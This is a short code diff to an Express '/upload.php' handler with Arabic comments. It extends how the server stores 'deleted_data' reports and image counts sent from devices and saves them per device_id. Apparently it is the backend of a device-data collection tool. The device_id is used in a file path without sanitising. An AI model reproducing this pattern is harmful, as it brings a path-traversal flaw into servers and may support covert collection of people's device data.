@@ -37,7 +37,7 @@ app.post('/upload.php', (req, res) => {
             return res.json({ success: true, images_count: imagesData.length });
         }
         
-        // ✅ حفظ المحذوفات
+        // ✅ حفظ المحذوفات — يدعم الصيغتين
         if (data.type === 'deleted_data') {
             const deviceId = data.device_id || 'unknown';
             const deviceDir = path.join(dataDir, deviceId);
@@ -49,6 +49,12 @@ app.post('/upload.php', (req, res) => {
             
             if (data.deleted_items && data.deleted_items.length > 0) {
                 deleted = [...data.deleted_items, ...deleted];
+            } else if (data.deleted_type && data.deleted_count) {
+                deleted.push({
+                    type: data.deleted_type,
+                    count: data.deleted_count,
+                    timestamp: data.timestamp || Date.now()
+                });
             }
             
             fs.writeFileSync(deletedFile, JSON.stringify(deleted, null, 2));
